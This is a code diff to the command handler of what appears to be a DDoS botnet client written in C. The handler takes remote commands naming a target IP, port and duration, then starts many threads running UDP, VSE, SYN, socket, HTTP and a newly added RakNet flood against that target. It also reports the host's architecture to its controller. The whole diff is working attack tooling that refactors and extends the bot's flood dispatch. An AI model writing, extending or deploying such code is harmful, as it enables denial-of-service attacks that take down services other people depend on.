@@ -14,6 +14,7 @@
 #include "http_attack.h"
 #include "socket_attack.h"
 #include "vse_attack.h"
+#include "raknet_attack.h"
 #include "attack_params.h"
 #include "daemon.h"
 
@@ -51,58 +52,91 @@ void handle_command(const char *command, int sock) {
     static attack_params* params = NULL;
     static pthread_t threads[MAX_THREADS];
     const char* arch = get_arch();
+
     if (strcmp(command, "ping") == 0) {
         char buffer[256];
         snprintf(buffer, sizeof(buffer), "pong %s", arch);
         send(sock, buffer, strlen(buffer), 0);
-    } else if (strncmp(command, "!udp", 4) == 0 || strncmp(command, "!vse", 4) == 0 || strncmp(command, "!syn", 4) == 0 || strncmp(command, "!socket", 7) == 0 || strncmp(command, "!http", 5) == 0) {
-        char ip[20];
-        int port, time;
-        if (sscanf(command + 5, "%s %d %d", ip, &port, &time) == 3) {
-            if (params != NULL) {
-                params->active = 0;
-                for (int i = 0; i < MAX_THREADS; i++) {
-                    pthread_cancel(threads[i]);
-                }
-                free(params);
-            }
-            params = malloc(sizeof(attack_params));
-            params->target_addr.sin_family = AF_INET;
-            params->target_addr.sin_port = htons(port);
-            inet_pton(AF_INET, ip, &params->target_addr.sin_addr);
-            params->duration = time;
-            params->active = 1;
+        return;
+    }
 
-            if (strncmp(command, "!udp", 4) == 0) {
-                for (int i = 0; i < MAX_THREADS; i++) {
-                    pthread_create(&threads[i], NULL, udp_attack, params);
+    // Supported attacks
+    int is_attack = 0;
+    const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet"};
+    int method_len[] = {4, 4, 4, 7, 5, 7};
+    int which = -1;
+    for (int i = 0; i < 6; i++) {
+        if (strncmp(command, methods[i], method_len[i]) == 0) {
+            is_attack = 1;
+            which = i;
+            break;
+        }
+    }
+
+    if (is_attack) {
+        char ip[32] = {0};
+        int port = 0, time = 0;
+        int psize = 0, srcport = 0;
+        char argstr[512] = {0};
+
+        // Parse command and optional arguments
+        int n = sscanf(command, "%*s %31s %d %d %[^\n]", ip, &port, &time, argstr);
+
+        if (n < 3) return; // Not enough arguments
+
+        // Parse optional arguments
+        if (n == 4 && strlen(argstr) > 0) {
+            char *token = strtok(argstr, " ");
+            while (token) {
+                if (strncmp(token, "psize=", 6) == 0) {
+                    psize = atoi(token + 6);
+                } else if (strncmp(token, "srcport=", 8) == 0) {
+                    srcport = atoi(token + 8);
                 }
-            } else if (strncmp(command, "!vse", 4) == 0) {
-                for (int i = 0; i < MAX_THREADS; i++) {
-                    pthread_create(&threads[i], NULL, vse_attack, params);
-                }
-            } else if (strncmp(command, "!syn", 4) == 0) {
-                for (int i = 0; i < MAX_THREADS; i++) {
-                    pthread_create(&threads[i], NULL, syn_attack, params);
-                }
-            } else if (strncmp(command, "!socket", 7) == 0) {
-                for (int i = 0; i < MAX_THREADS; i++) {
-                    pthread_create(&threads[i], NULL, socket_attack, params);
-                }
-            } else if (strncmp(command, "!http", 5) == 0) {
-                for (int i = 0; i < MAX_THREADS; i++) {
-                    pthread_create(&threads[i], NULL, http_attack, params);
-                }
+                token = strtok(NULL, " ");
             }
-            sleep(time);
+        }
+
+        if (params != NULL) {
             params->active = 0;
             for (int i = 0; i < MAX_THREADS; i++) {
                 pthread_cancel(threads[i]);
             }
             free(params);
-            params = NULL;
         }
-    } else if (strcmp(command, "stop") == 0) {
+        params = malloc(sizeof(attack_params));
+        memset(params, 0, sizeof(attack_params));
+        params->target_addr.sin_family = AF_INET;
+        params->target_addr.sin_port = htons(port);
+        inet_pton(AF_INET, ip, &params->target_addr.sin_addr);
+        params->duration = time;
+        params->active = 1;
+        params->psize = psize;
+        params->srcport = srcport;
+
+        void* (*attack_func)(void*) = NULL;
+        switch (which) {
+            case 0: attack_func = udp_attack; break;
+            case 1: attack_func = vse_attack; break;
+            case 2: attack_func = syn_attack; break;
+            case 3: attack_func = socket_attack; break;
+            case 4: attack_func = http_attack; break;
+            case 5: attack_func = raknet_attack; break;
+        }
+        for (int i = 0; i < MAX_THREADS; i++) {
+            pthread_create(&threads[i], NULL, attack_func, params);
+        }
+        sleep(time);
+        params->active = 0;
+        for (int i = 0; i < MAX_THREADS; i++) {
+            pthread_cancel(threads[i]);
+        }
+        free(params);
+        params = NULL;
+        return;
+    }
+
+    if (strcmp(command, "stop") == 0) {
         if (params != NULL) {
             params->active = 0;
             for (int i = 0; i < MAX_THREADS; i++) {
@@ -111,6 +145,7 @@ void handle_command(const char *command, int sock) {
             free(params);
             params = NULL;
         }
+        return;
     }
 }
 
